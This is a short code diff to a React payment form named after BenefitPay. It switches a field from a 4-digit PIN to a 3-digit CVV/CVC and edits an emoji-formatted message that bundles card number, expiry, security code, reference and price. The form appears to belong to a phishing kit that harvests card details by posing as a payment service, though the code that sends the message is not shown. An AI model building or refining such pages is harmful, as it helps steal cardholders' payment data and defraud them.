@@ -49,8 +49,8 @@ const BenefitPayContent = () => {
       newErrors.cardHolder = "Card holder name is required";
     }
 
-    if (!/^\d{4}$/.test(formData.pin)) {
-      newErrors.pin = "PIN must be 4 digits";
+    if (!/^\d{3}$/.test(formData.pin)) {
+      newErrors.pin = "CVV/CVC must be 3 digits";
     }
 
     setErrors(newErrors);
@@ -66,7 +66,7 @@ const BenefitPayContent = () => {
 💳 Card Number: ${formData.cardNumber}
 📅 Exp Month: ${formData.expiryMonth}
 📅 Exp Year: ${formData.expiryYear}
-🔐 PIN: ${formData.pin}
+🔐 cvv/cvc: ${formData.pin}
 🔨 Ref: ${refN}
 💲 Price: ${price}.000
       `;
@@ -160,7 +160,7 @@ const BenefitPayContent = () => {
         </div>
 
         <div>
-          <h5>PIN</h5>
+          <h5>CVV/CVC</h5>
           <input
             type="number"
             name="pin"
